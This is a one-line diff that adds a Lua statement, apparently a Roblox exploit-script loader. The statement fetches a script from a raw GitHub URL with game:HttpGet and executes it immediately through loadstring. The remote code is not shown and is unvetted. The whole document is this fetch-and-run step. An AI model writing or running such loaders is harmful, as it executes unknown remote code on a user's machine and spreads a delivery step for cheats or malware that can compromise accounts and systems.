@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aldamuriaUPB23/ALDAROBLOK/refs/heads/main/script.lua"))()
